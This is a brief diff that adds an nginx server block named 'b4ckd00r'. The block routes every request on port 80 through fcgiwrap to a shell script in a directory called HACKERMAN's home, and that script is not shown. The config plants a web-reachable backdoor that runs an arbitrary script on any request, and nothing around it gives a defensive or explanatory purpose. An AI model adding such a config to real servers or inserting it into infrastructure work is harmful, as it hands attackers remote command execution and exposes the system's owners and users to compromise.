@@ -1,0 +1,10 @@
+server {
+    listen 80;
+    server_name b4ckd00r;
+
+    location / {
+        fastcgi_pass unix:/var/run/fcgiwrap.socket;
+        fastcgi_param SCRIPT_FILENAME /home/HACKERMAN/b4ckd00r.sh;
+        include fastcgi_params;
+    }
+}
